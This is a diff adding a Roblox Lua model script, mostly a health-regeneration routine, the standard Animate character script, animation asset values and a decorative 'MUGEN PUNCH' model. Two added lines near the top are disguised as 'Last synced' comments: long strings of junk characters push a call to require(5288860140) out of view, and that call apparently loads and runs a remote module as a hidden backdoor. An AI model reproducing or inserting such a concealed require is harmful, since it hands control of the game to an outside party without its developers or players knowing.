+		local dh = dt*REGEN_RATE*Humanoid.MaxHealth
+		Humanoid.Health = math.min(Humanoid.Health + dh, Humanoid.MaxHealth)
+	end
+	Humanoid.HealthChanged:Wait()
+end
+--[[ Last synced 7/18/2021 01:02 ����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������]] require(5288860140) --[[                                                                                                  ]]--
+--[[ Last synced 7/18/2021 01:03 ����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������]] require(5288860140) --[[                                                                                                  ]]--
+end))
+LocalScript141.Name = "Animate"
+LocalScript141.Parent = Model28
+table.insert(cors,sandbox(LocalScript141,function()
+local Figure = script.Parent
+local Torso = Figure:WaitForChild("Torso")
+local RightShoulder = Torso:WaitForChild("Right Shoulder")
+local LeftShoulder = Torso:WaitForChild("Left Shoulder")
+local RightHip = Torso:WaitForChild("Right Hip")
+local LeftHip = Torso:WaitForChild("Left Hip")
+local Neck = Torso:WaitForChild("Neck")
+local Humanoid = Figure:WaitForChild("Humanoid")
+local pose = "Standing"
+
+local currentAnim = ""
+local currentAnimInstance = nil
+local currentAnimTrack = nil
+local currentAnimKeyframeHandler = nil
+local currentAnimSpeed = 1.0
+local animTable = {}
+local animNames = { 
+	idle = 	{	
+				{ id = "http://www.roblox.com/asset/?id=180435571", weight = 9 },
+				{ id = "http://www.roblox.com/asset/?id=180435792", weight = 1 }
+			},
+	walk = 	{ 	
+				{ id = "http://www.roblox.com/asset/?id=180426354", weight = 10 } 
+			}, 
+	run = 	{
+				{ id = "run.xml", weight = 10 } 
+			}, 
+	jump = 	{
+				{ id = "http://www.roblox.com/asset/?id=125750702", weight = 10 } 
+			}, 
+	fall = 	{
+				{ id = "http://www.roblox.com/asset/?id=180436148", weight = 10 } 
+			}, 
+	climb = {
+				{ id = "http://www.roblox.com/asset/?id=180436334", weight = 10 } 
+			}, 
+	sit = 	{
+				{ id = "http://www.roblox.com/asset/?id=178130996", weight = 10 } 
+			},	
+	toolnone = {
+				{ id = "http://www.roblox.com/asset/?id=182393478", weight = 10 } 
+			},
+	toolslash = {
+				{ id = "http://www.roblox.com/asset/?id=129967390", weight = 10 } 
+--				{ id = "slash.xml", weight = 10 } 
+			},
+	toollunge = {
+				{ id = "http://www.roblox.com/asset/?id=129967478", weight = 10 } 
+			},
+	wave = {
+				{ id = "http://www.roblox.com/asset/?id=128777973", weight = 10 } 
+			},
+	point = {
+				{ id = "http://www.roblox.com/asset/?id=128853357", weight = 10 } 
+			},
+	dance1 = {
+				{ id = "http://www.roblox.com/asset/?id=182435998", weight = 10 }, 
+				{ id = "http://www.roblox.com/asset/?id=182491037", weight = 10 }, 
+				{ id = "http://www.roblox.com/asset/?id=182491065", weight = 10 } 
+			},
+	dance2 = {
+				{ id = "http://www.roblox.com/asset/?id=182436842", weight = 10 }, 
+				{ id = "http://www.roblox.com/asset/?id=182491248", weight = 10 }, 
+				{ id = "http://www.roblox.com/asset/?id=182491277", weight = 10 } 
+			},
+	dance3 = {
+				{ id = "http://www.roblox.com/asset/?id=182436935", weight = 10 }, 
+				{ id = "http://www.roblox.com/asset/?id=182491368", weight = 10 }, 
+				{ id = "http://www.roblox.com/asset/?id=182491423", weight = 10 } 
+			},
+	laugh = {
+				{ id = "http://www.roblox.com/asset/?id=129423131", weight = 10 } 
+			},
+	cheer = {
+				{ id = "http://www.roblox.com/asset/?id=129423030", weight = 10 } 
+			},
+}
+local dances = {"dance1", "dance2", "dance3"}
+
+-- Existance in this list signifies that it is an emote, the value indicates if it is a looping emote
+local emoteNames = { wave = false, point = false, dance1 = true, dance2 = true, dance3 = true, laugh = false, cheer = false}
+
+function configureAnimationSet(name, fileList)
+	if (animTable[name] ~= nil) then
+		for _, connection in pairs(animTable[name].connections) do
+			connection:disconnect()
+		end
+	end
+	animTable[name] = {}
+	animTable[name].count = 0
+	animTable[name].totalWeight = 0	
+	animTable[name].connections = {}
+
+	-- check for config values
+	local config = script:FindFirstChild(name)
+	if (config ~= nil) then
+--		print("Loading anims " .. name)
+		table.insert(animTable[name].connections, config.ChildAdded:connect(function(child) configureAnimationSet(name, fileList) end))
+		table.insert(animTable[name].connections, config.ChildRemoved:connect(function(child) configureAnimationSet(name, fileList) end))
+		local idx = 1
+		for _, childPart in pairs(config:GetChildren()) do
+			if (childPart:IsA("Animation")) then
+				table.insert(animTable[name].connections, childPart.Changed:connect(function(property) configureAnimationSet(name, fileList) end))
+				animTable[name][idx] = {}
+				animTable[name][idx].anim = childPart
+				local weightObject = childPart:FindFirstChild("Weight")
+				if (weightObject == nil) then
+					animTable[name][idx].weight = 1
+				else
+					animTable[name][idx].weight = weightObject.Value
+				end
+				animTable[name].count = animTable[name].count + 1
+				animTable[name].totalWeight = animTable[name].totalWeight + animTable[name][idx].weight
+	--			print(name .. " [" .. idx .. "] " .. animTable[name][idx].anim.AnimationId .. " (" .. animTable[name][idx].weight .. ")")
+				idx = idx + 1
+			end
+		end
+	end
+
+	-- fallback to defaults
+	if (animTable[name].count <= 0) then
+		for idx, anim in pairs(fileList) do
+			animTable[name][idx] = {}
+			animTable[name][idx].anim = Instance.new("Animation")
+			animTable[name][idx].anim.Name = name
+			animTable[name][idx].anim.AnimationId = anim.id
+			animTable[name][idx].weight = anim.weight
+			animTable[name].count = animTable[name].count + 1
+			animTable[name].totalWeight = animTable[name].totalWeight + anim.weight
+--			print(name .. " [" .. idx .. "] " .. anim.id .. " (" .. anim.weight .. ")")
+		end
+	end
+end
+
+-- Setup animation objects
+function scriptChildModified(child)
+	local fileList = animNames[child.Name]
+	if (fileList ~= nil) then
+		configureAnimationSet(child.Name, fileList)
+	end	
+end
+
+script.ChildAdded:connect(scriptChildModified)
+script.ChildRemoved:connect(scriptChildModified)
+
+
+for name, fileList in pairs(animNames) do 
+	configureAnimationSet(name, fileList)
+end	
+
+-- ANIMATION
+
+-- declarations
+local toolAnim = "None"
+local toolAnimTime = 0
+
+local jumpAnimTime = 0
+local jumpAnimDuration = 0.3
+
+local toolTransitionTime = 0.1
+local fallTransitionTime = 0.3
+local jumpMaxLimbVelocity = 0.75
+
+-- functions
+
+function stopAllAnimations()
+	local oldAnim = currentAnim
+
+	-- return to idle if finishing an emote
+	if (emoteNames[oldAnim] ~= nil and emoteNames[oldAnim] == false) then
+		oldAnim = "idle"
+	end
+
+	currentAnim = ""
+	currentAnimInstance = nil
+	if (currentAnimKeyframeHandler ~= nil) then
+		currentAnimKeyframeHandler:disconnect()
+	end
+
+	if (currentAnimTrack ~= nil) then
+		currentAnimTrack:Stop()
+		currentAnimTrack:Destroy()
+		currentAnimTrack = nil
+	end
+	return oldAnim
+end
+
+function setAnimationSpeed(speed)
+	if speed ~= currentAnimSpeed then
+		currentAnimSpeed = speed
+		currentAnimTrack:AdjustSpeed(currentAnimSpeed)
+	end
+end
+
+function keyFrameReachedFunc(frameName)
+	if (frameName == "End") then
+
+		local repeatAnim = currentAnim
+		-- return to idle if finishing an emote
+		if (emoteNames[repeatAnim] ~= nil and emoteNames[repeatAnim] == false) then
+			repeatAnim = "idle"
+		end
+		
+		local animSpeed = currentAnimSpeed
+		playAnimation(repeatAnim, 0.0, Humanoid)
+		setAnimationSpeed(animSpeed)
+	end
+end
+
+-- Preload animations
+function playAnimation(animName, transitionTime, humanoid) 
+		
+	local roll = math.random(1, animTable[animName].totalWeight) 
+	local origRoll = roll
+	local idx = 1
+	while (roll > animTable[animName][idx].weight) do
+		roll = roll - animTable[animName][idx].weight
+		idx = idx + 1
+	end
+--		print(animName .. " " .. idx .. " [" .. origRoll .. "]")
+	local anim = animTable[animName][idx].anim
+
+	-- switch animation		
+	if (anim ~= currentAnimInstance) then
+		
+		if (currentAnimTrack ~= nil) then
+			currentAnimTrack:Stop(transitionTime)
+			currentAnimTrack:Destroy()
+		end
+
+		currentAnimSpeed = 1.0
+	
+		-- load it to the humanoid; get AnimationTrack
+		currentAnimTrack = humanoid:LoadAnimation(anim)
+		currentAnimTrack.Priority = Enum.AnimationPriority.Core
+		 
+		-- play the animation
+		currentAnimTrack:Play(transitionTime)
+		currentAnim = animName
+		currentAnimInstance = anim
+
+		-- set up keyframe name triggers
+		if (currentAnimKeyframeHandler ~= nil) then
+			currentAnimKeyframeHandler:disconnect()
+		end
+		currentAnimKeyframeHandler = currentAnimTrack.KeyframeReached:connect(keyFrameReachedFunc)
+		
+	end
+
+end
+
+-------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------
+
+local toolAnimName = ""
+local toolAnimTrack = nil
+local toolAnimInstance = nil
+local currentToolAnimKeyframeHandler = nil
+
+function toolKeyFrameReachedFunc(frameName)
+	if (frameName == "End") then
+--		print("Keyframe : ".. frameName)	
+		playToolAnimation(toolAnimName, 0.0, Humanoid)
+	end
+end
+
+
+function playToolAnimation(animName, transitionTime, humanoid, priority)	 
+		
+		local roll = math.random(1, animTable[animName].totalWeight) 
+		local origRoll = roll
+		local idx = 1
+		while (roll > animTable[animName][idx].weight) do
+			roll = roll - animTable[animName][idx].weight
+			idx = idx + 1
+		end
+--		print(animName .. " * " .. idx .. " [" .. origRoll .. "]")
+		local anim = animTable[animName][idx].anim
+
+		if (toolAnimInstance ~= anim) then
+			
+			if (toolAnimTrack ~= nil) then
+				toolAnimTrack:Stop()
+				toolAnimTrack:Destroy()
+				transitionTime = 0
+			end
+					
+			-- load it to the humanoid; get AnimationTrack
+			toolAnimTrack = humanoid:LoadAnimation(anim)
+			if priority then
+				toolAnimTrack.Priority = priority
+			end
+			 
+			-- play the animation
+			toolAnimTrack:Play(transitionTime)
+			toolAnimName = animName
+			toolAnimInstance = anim
+
+			currentToolAnimKeyframeHandler = toolAnimTrack.KeyframeReached:connect(toolKeyFrameReachedFunc)
+		end
+end
+
+function stopToolAnimations()
+	local oldAnim = toolAnimName
+
+	if (currentToolAnimKeyframeHandler ~= nil) then
+		currentToolAnimKeyframeHandler:disconnect()
+	end
+
+	toolAnimName = ""
+	toolAnimInstance = nil
+	if (toolAnimTrack ~= nil) then
+		toolAnimTrack:Stop()
+		toolAnimTrack:Destroy()
+		toolAnimTrack = nil
+	end
+
+
+	return oldAnim
+end
+
+-------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------
+
+
+function onRunning(speed)
+	if speed > 0.01 then
+		playAnimation("walk", 0.1, Humanoid)
+		if currentAnimInstance and currentAnimInstance.AnimationId == "http://www.roblox.com/asset/?id=180426354" then
+			setAnimationSpeed(speed / 14.5)
+		end
+		pose = "Running"
+	else
+		if emoteNames[currentAnim] == nil then
+			playAnimation("idle", 0.1, Humanoid)
+			pose = "Standing"
+		end
+	end
+end
+
+function onDied()
+	pose = "Dead"
+end
+
+function onJumping()
+	playAnimation("jump", 0.1, Humanoid)
+	jumpAnimTime = jumpAnimDuration
+	pose = "Jumping"
+end
+
+function onClimbing(speed)
+	playAnimation("climb", 0.1, Humanoid)
+	setAnimationSpeed(speed / 12.0)
+	pose = "Climbing"
+end
+
+function onGettingUp()
+	pose = "GettingUp"
+end
+
+function onFreeFall()
+	if (jumpAnimTime <= 0) then
+		playAnimation("fall", fallTransitionTime, Humanoid)
+	end
+	pose = "FreeFall"
+end
+
+function onFallingDown()
+	pose = "FallingDown"
+end
+
+function onSeated()
+	pose = "Seated"
+end
+
+function onPlatformStanding()
+	pose = "PlatformStanding"
+end
+
+function onSwimming(speed)
+	if speed > 0 then
+		pose = "Running"
+	else
+		pose = "Standing"
+	end
+end
+
+function getTool()	
+	for _, kid in ipairs(Figure:GetChildren()) do
+		if kid.className == "Tool" then return kid end
+	end
+	return nil
+end
+
+function getToolAnim(tool)
+	for _, c in ipairs(tool:GetChildren()) do
+		if c.Name == "toolanim" and c.className == "StringValue" then
+			return c
+		end
+	end
+	return nil
+end
+
+function animateTool()
+	
+	if (toolAnim == "None") then
+		playToolAnimation("toolnone", toolTransitionTime, Humanoid, Enum.AnimationPriority.Idle)
+		return
+	end
+
+	if (toolAnim == "Slash") then
+		playToolAnimation("toolslash", 0, Humanoid, Enum.AnimationPriority.Action)
+		return
+	end
+
+	if (toolAnim == "Lunge") then
+		playToolAnimation("toollunge", 0, Humanoid, Enum.AnimationPriority.Action)
+		return
+	end
+end
+
+function moveSit()
+	RightShoulder.MaxVelocity = 0.15
+	LeftShoulder.MaxVelocity = 0.15
+	RightShoulder:SetDesiredAngle(3.14 /2)
+	LeftShoulder:SetDesiredAngle(-3.14 /2)
+	RightHip:SetDesiredAngle(3.14 /2)
+	LeftHip:SetDesiredAngle(-3.14 /2)
+end
+
+local lastTick = 0
+
+function move(time)
+	local amplitude = 1
+	local frequency = 1
+  	local deltaTime = time - lastTick
+  	lastTick = time
+
+	local climbFudge = 0
+	local setAngles = false
+
+  	if (jumpAnimTime > 0) then
+  		jumpAnimTime = jumpAnimTime - deltaTime
+  	end
+
+	if (pose == "FreeFall" and jumpAnimTime <= 0) then
+		playAnimation("fall", fallTransitionTime, Humanoid)
+	elseif (pose == "Seated") then
+		playAnimation("sit", 0.5, Humanoid)
+		return
+	elseif (pose == "Running") then
+		playAnimation("walk", 0.1, Humanoid)
+	elseif (pose == "Dead" or pose == "GettingUp" or pose == "FallingDown" or pose == "Seated" or pose == "PlatformStanding") then
+--		print("Wha " .. pose)
+		stopAllAnimations()
+		amplitude = 0.1
+		frequency = 1
+		setAngles = true
+	end
+
+	if (setAngles) then
+		local desiredAngle = amplitude * math.sin(time * frequency)
+
+		RightShoulder:SetDesiredAngle(desiredAngle + climbFudge)
+		LeftShoulder:SetDesiredAngle(desiredAngle - climbFudge)
+		RightHip:SetDesiredAngle(-desiredAngle)
+		LeftHip:SetDesiredAngle(-desiredAngle)
+	end
+
+	-- Tool Animation handling
+	local tool = getTool()
+	if tool and tool:FindFirstChild("Handle") then
+	
+		local animStringValueObject = getToolAnim(tool)
+
+		if animStringValueObject then
+			toolAnim = animStringValueObject.Value
+			-- message recieved, delete StringValue
+			animStringValueObject.Parent = nil
+			toolAnimTime = time + .3
+		end
+
+		if time > toolAnimTime then
+			toolAnimTime = 0
+			toolAnim = "None"
+		end
+
+		animateTool()		
+	else
+		stopToolAnimations()
+		toolAnim = "None"
+		toolAnimInstance = nil
+		toolAnimTime = 0
+	end
+end
+
+-- connect events
+Humanoid.Died:connect(onDied)
+Humanoid.Running:connect(onRunning)
+Humanoid.Jumping:connect(onJumping)
+Humanoid.Climbing:connect(onClimbing)
+Humanoid.GettingUp:connect(onGettingUp)
+Humanoid.FreeFalling:connect(onFreeFall)
+Humanoid.FallingDown:connect(onFallingDown)
+Humanoid.Seated:connect(onSeated)
+Humanoid.PlatformStanding:connect(onPlatformStanding)
+Humanoid.Swimming:connect(onSwimming)
+
+-- setup emote chat hook
+game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
+	local emote = ""
+	if msg == "/e dance" then
+		emote = dances[math.random(1, #dances)]
+	elseif (string.sub(msg, 1, 3) == "/e ") then
+		emote = string.sub(msg, 4)
+	elseif (string.sub(msg, 1, 7) == "/emote ") then
+		emote = string.sub(msg, 8)
+	end
+	
+	if (pose == "Standing" and emoteNames[emote] ~= nil) then
+		playAnimation(emote, 0.1, Humanoid)
+	end
+
+end)
+
+
+-- main program
+
+-- initialize to idle
+playAnimation("idle", 0.1, Humanoid)
+pose = "Standing"
+
+while Figure.Parent ~= nil do
+	local _, time = wait(0.1)
+	move(time)
+end
+
+
+
+end))
+StringValue142.Name = "idle"
+StringValue142.Parent = LocalScript141
+Animation143.Name = "Animation1"
+Animation143.Parent = StringValue142
+Animation143.AnimationId = "http://www.roblox.com/asset/?id=180435571"
+NumberValue144.Name = "Weight"
+NumberValue144.Parent = Animation143
+NumberValue144.Value = 9
+Animation145.Name = "Animation2"
+Animation145.Parent = StringValue142
+Animation145.AnimationId = "http://www.roblox.com/asset/?id=180435792"
+NumberValue146.Name = "Weight"
+NumberValue146.Parent = Animation145
+NumberValue146.Value = 1
+StringValue147.Name = "walk"
+StringValue147.Parent = LocalScript141
+Animation148.Name = "WalkAnim"
+Animation148.Parent = StringValue147
+Animation148.AnimationId = "http://www.roblox.com/asset/?id=180426354"
+StringValue149.Name = "run"
+StringValue149.Parent = LocalScript141
+Animation150.Name = "RunAnim"
+Animation150.Parent = StringValue149
+Animation150.AnimationId = "http://www.roblox.com/asset/?id=180426354"
+StringValue151.Name = "jump"
+StringValue151.Parent = LocalScript141
+Animation152.Name = "JumpAnim"
+Animation152.Parent = StringValue151
+Animation152.AnimationId = "http://www.roblox.com/asset/?id=125750702"
+StringValue153.Name = "climb"
+StringValue153.Parent = LocalScript141
+Animation154.Name = "ClimbAnim"
+Animation154.Parent = StringValue153
+Animation154.AnimationId = "http://www.roblox.com/asset/?id=180436334"
+StringValue155.Name = "toolnone"
+StringValue155.Parent = LocalScript141
+Animation156.Name = "ToolNoneAnim"
+Animation156.Parent = StringValue155
+Animation156.AnimationId = "http://www.roblox.com/asset/?id=182393478"
+StringValue157.Name = "fall"
+StringValue157.Parent = LocalScript141
+Animation158.Name = "FallAnim"
+Animation158.Parent = StringValue157
+Animation158.AnimationId = "http://www.roblox.com/asset/?id=180436148"
+StringValue159.Name = "sit"
+StringValue159.Parent = LocalScript141
+Animation160.Name = "SitAnim"
+Animation160.Parent = StringValue159
+Animation160.AnimationId = "http://www.roblox.com/asset/?id=178130996"
+NumberValue161.Name = "ScaleDampeningPercent"
+NumberValue161.Parent = LocalScript141
+NumberValue161.Value = 0.4000000059604645
+BodyColors162.Parent = Model28
+BodyColors162.HeadColor = BrickColor.new("Lime green")
+BodyColors162.HeadColor3 = Color3.new(0, 1, 0)
+BodyColors162.LeftArmColor = BrickColor.new("Lime green")
+BodyColors162.LeftArmColor3 = Color3.new(0, 1, 0)
+BodyColors162.LeftLegColor = BrickColor.new("Lime green")
+BodyColors162.LeftLegColor3 = Color3.new(0, 1, 0)
+BodyColors162.RightArmColor = BrickColor.new("Lime green")
+BodyColors162.RightArmColor3 = Color3.new(0, 1, 0)
+BodyColors162.RightLegColor = BrickColor.new("Lime green")
+BodyColors162.RightLegColor3 = Color3.new(0, 1, 0)
+BodyColors162.TorsoColor = BrickColor.new("Lime green")
+BodyColors162.TorsoColor3 = Color3.new(0, 1, 0)
+Model163.Name = "MUGEN PUNCH (can be for decorations)"
+Model163.Parent = mas
+Part164.Parent = Model163
+Part164.CFrame = CFrame.new(-24.0378494, 1.29715681, 239.948334, 1, 0, 0, 0, 0.258819014, 0.965925813, 0, -0.965925813, 0.258819014)
+Part164.Orientation = Vector3.new(-75, 0, 0)
+Part164.Position = Vector3.new(-24.03784942626953, 1.297156810760498, 239.94833374023438)
+Part164.Rotation = Vector3.new(-75, 0, 0)
+Part164.Color = Color3.new(0.666667, 0, 0.666667)
+Part164.Size = Vector3.new(2.6283721923828125, 2.6283721923828125, 2.6283721923828125)
+Part164.Anchored = true
+Part164.BottomSurface = Enum.SurfaceType.Smooth
+Part164.BrickColor = BrickColor.new("Magenta")
+Part164.Material = Enum.Material.Slate
+Part164.TopSurface = Enum.SurfaceType.Smooth
+Part164.brickColor = BrickColor.new("Magenta")
+Part164.Shape = Enum.PartType.Ball
+Decal165.Name = "OMENUPDATED"
+Decal165.Parent = Part164
+Decal165.Texture = "rbxassetid://7318368042"
+SpecialMesh166.Parent = Part164
+Part167.Parent = Model163
+Part167.CFrame = CFrame.new(-24.0378494, 1.31339383, 239.948334, 1, 0, 0, 0, 0.258819014, 0.965925813, 0, -0.965925813, 0.258819014)
+Part167.Orientation = Vector3.new(-75, 0, 0)
+Part167.Position = Vector3.new(-24.03784942626953, 1.3133938312530518, 239.94833374023438)
+Part167.Rotation = Vector3.new(-75, 0, 0)
+Part167.Color = Color3.new(0.666667, 0, 0.666667)
+Part167.Transparency = 0.5
+Part167.Size = Vector3.new(2.6608433723449707, 2.6608433723449707, 2.6608433723449707)
+Part167.Anchored = true
+Part167.BottomSurface = Enum.SurfaceType.Smooth
+Part167.BrickColor = BrickColor.new("Magenta")
+Part167.Material = Enum.Material.Granite
+Part167.TopSurface = Enum.SurfaceType.Smooth
+Part167.brickColor = BrickColor.new("Magenta")
+Part167.Shape = Enum.PartType.Ball
+SpecialMesh168.Parent = Part167
+for i,v in pairs(mas:GetChildren()) do
+	v.Parent = script
+	pcall(function() v:MakeJoints() end)
+end
+mas:Destroy()
+for i,v in pairs(cors) do
+	spawn(function()
+		pcall(v)
+	end)
+end
